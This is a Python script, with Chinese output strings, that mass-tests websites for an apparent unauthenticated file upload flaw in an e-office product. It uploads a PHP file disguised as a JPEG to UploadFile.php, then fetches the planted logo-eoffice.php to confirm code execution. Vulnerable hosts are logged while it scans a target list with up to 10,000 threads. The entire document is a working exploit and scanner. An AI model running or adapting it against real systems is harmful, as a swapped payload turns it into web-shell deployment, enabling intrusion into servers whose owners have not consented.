import requests
import threadpool
import os
import urllib3
urllib3.disable_warnings()

headers = {"Cache-Control": "max-age=0", "Upgrade-Insecure-Requests": "1", "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Safari/537.36", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9", "Accept-Encoding": "gzip, deflate", "Accept-Language": "zh-CN,zh;q=0.9", "Connection": "close", "Content-Type": "multipart/form-data; boundary=e64bdf16c554bbc109cecef6451c26a4"}
data = "--e64bdf16c554bbc109cecef6451c26a4\r\nContent-Disposition: form-data; name=\"Filedata\"; filename=\"test.php\"\r\nContent-Type: image/jpeg\r\n\r\n<?php echo \"bbb\"; ?> \r\n\r\n--e64bdf16c554bbc109cecef6451c26a4--\r\n"

def exp(url):
    poc = "/general/index/UploadFile.php?m=uploadPicture&uploadType=eoffice_logo&userId="
    url1 = url + poc
    try:
        res = requests.post(url1, headers=headers, data=data,verify=False)
        url = url + "/images/logo/logo-eoffice.php"
        res = requests.get(url, headers=headers, verify=False)
        if "bbb" in res.text:
            print("[*]存在漏洞的url：" + url)
            with open ("cunzai.txt", 'a') as f:
                f.write(url + "\n")
    except:
        pass

def multithreading(funcname, params=[], filename="url.txt", pools=10000):
    threads = []
    with open(filename, "r") as f:
        for i in f:
            func_params = [i.rstrip("\n")] + params
            threads.append((func_params, None))
    pool = threadpool.ThreadPool(pools)
    reqs = threadpool.makeRequests(funcname, threads)
    [pool.putRequest(req) for req in reqs]
    pool.wait()

def main():
    if os.path.exists("cunzai.txt"):
        f = open("cunzai.txt", 'w')
        f.truncate()
    multithreading(exp, [], "url.txt", 10000)

if __name__ == '__main__':
    main()
    print("已完成")



